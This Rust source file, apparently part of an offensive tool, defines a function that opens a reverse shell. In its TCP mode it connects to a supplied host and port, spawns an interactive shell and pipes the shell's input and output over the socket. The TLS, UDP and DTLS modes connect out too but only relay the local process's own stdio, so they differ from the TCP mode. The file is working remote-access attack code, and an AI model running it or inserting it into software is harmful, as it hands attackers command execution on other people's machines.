use std::io::{copy, Result, Read, Write};
use std::net::{TcpStream, UdpSocket, SocketAddr};
use std::process::{Command, Stdio};
use std::thread;
use crate::input::Protocol;

pub(crate) fn shell(host: String, port: String, shell: String, proto: Protocol, cert_data: Option<Vec<u8>>, key_data: Option<Vec<u8>>) -> Result<()> {
    match proto {
        Protocol::Tcp => {
            let mut sock_write = TcpStream::connect(format!("{}:{}", host, port))?;
            let mut sock_write_err = sock_write.try_clone()?;
            let mut sock_read = sock_write.try_clone()?;
            let mut child = Command::new(shell)
                .arg("-i")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?;
            let mut stdin = child.stdin.take().expect("Failed to open stdin");
            let mut stdout = child.stdout.take().expect("Failed to open stdout");
            let mut stderr = child.stderr.take().expect("Failed to open stderr");
            thread::spawn(move || {
                copy(&mut stdout, &mut sock_write).expect("stdout closed");
            });
            thread::spawn(move || {
                copy(&mut stderr, &mut sock_write_err).expect("stderr closed");
            });
            thread::spawn(move || {
                copy(&mut sock_read, &mut stdin).expect("stdin closed");
            });
            child.wait()?;
        }
        Protocol::Tls => {
            use std::sync::Arc;
            use rustls::ClientConfig;
            use webpki_roots::TLS_SERVER_ROOTS;
            use crate::listener::tls::connect_tls;
            let mut root_store = rustls::RootCertStore::empty();
            root_store.extend(TLS_SERVER_ROOTS.iter().cloned());
            let config = ClientConfig::builder()
                .with_root_certificates(root_store)
                .with_no_client_auth();
            let config = Arc::new(config);
            let stream = TcpStream::connect(format!("{}:{}", host, port))?;
            let mut tls_stream = connect_tls(stream, config, &host)?;
            // Pipe stdio <-> tls_stream
            let mut stdin = std::io::stdin();
            let mut stdout = std::io::stdout();
            let mut tls_stream_clone = tls_stream.get_ref().try_clone().ok();
            // Thread to read from stdin and write to tls_stream
            let mut tls_stream_write = tls_stream;
            let writer = thread::spawn(move || {
                let mut buf = [0u8; 4096];
                loop {
                    let n = match stdin.read(&mut buf) {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    if tls_stream_write.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
            });
            // Thread to read from tls_stream and write to stdout
            if let Some(mut tls_stream_clone) = tls_stream_clone {
                let reader = thread::spawn(move || {
                    let mut buf = [0u8; 4096];
                    loop {
                        let n = match tls_stream_clone.read(&mut buf) {
                            Ok(0) => break,
                            Ok(n) => n,
                            Err(_) => break,
                        };
                        if stdout.write_all(&buf[..n]).is_err() {
                            break;
                        }
                        let _ = stdout.flush();
                    }
                });
                let _ = reader.join();
            }
            let _ = writer.join();
        }
        Protocol::Udp => {
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            sock.connect(addr)?;
            // Pipe stdio <-> udp socket
            let sock_clone = sock.try_clone().ok();
            let mut stdin = std::io::stdin();
            let mut stdout = std::io::stdout();
            // Thread to read from stdin and write to UDP socket
            let mut sock_write = sock;
            let writer = thread::spawn(move || {
                let mut buf = [0u8; 4096];
                loop {
                    let n = match stdin.read(&mut buf) {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    if sock_write.send(&buf[..n]).is_err() {
                        break;
                    }
                }
            });
            // Thread to read from UDP socket and write to stdout
            if let Some(sock_clone) = sock_clone {
                let reader = thread::spawn(move || {
                    let mut buf = [0u8; 4096];
                    loop {
                        let n = match sock_clone.recv(&mut buf) {
                            Ok(0) => break,
                            Ok(n) => n,
                            Err(_) => break,
                        };
                        if stdout.write_all(&buf[..n]).is_err() {
                            break;
                        }
                        let _ = stdout.flush();
                    }
                });
                let _ = reader.join();
            }
            let _ = writer.join();
        }
        Protocol::Dtls => {
            use udp_dtls::{Identity, Certificate};
            use crate::listener::tls::connect_dtls;
            use std::thread;
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            let identity = match (cert_data.as_ref(), key_data.as_ref()) {
                (Some(cert), Some(key)) => Identity::from_pem(cert, key).expect("Invalid cert/key for DTLS"),
                _ => panic!("DTLS requires --cert and --key")
            };
            let peer_cert = match cert_data.as_ref() {
                Some(cert) => Certificate::from_pem(cert).expect("Invalid peer cert for DTLS"),
                None => panic!("DTLS requires --cert for peer cert")
            };
            let mut dtls_stream = connect_dtls(sock, addr, identity, peer_cert)?;
            // Pipe stdio <-> dtls_stream
            let mut stdin = std::io::stdin();
            let mut stdout = std::io::stdout();
            let mut stream_clone = dtls_stream.try_clone().ok();
            // Thread to read from stdin and write to dtls_stream
            let mut dtls_stream_write = dtls_stream;
            let writer = thread::spawn(move || {
                let mut buf = [0u8; 4096];
                loop {
                    let n = match stdin.read(&mut buf) {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    if dtls_stream_write.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
            });
            // Thread to read from dtls_stream and write to stdout
            if let Some(mut stream_clone) = stream_clone {
                let reader = thread::spawn(move || {
                    let mut buf = [0u8; 4096];
                    loop {
                        let n = match stream_clone.read(&mut buf) {
                            Ok(0) => break,
                            Ok(n) => n,
                            Err(_) => break,
                        };
                        if stdout.write_all(&buf[..n]).is_err() {
                            break;
                        }
                        let _ = stdout.flush();
                    }
                });
                let _ = reader.join();
            }
            let _ = writer.join();
        }
    }
    log::warn!("Shell exited");
    Ok(())
}
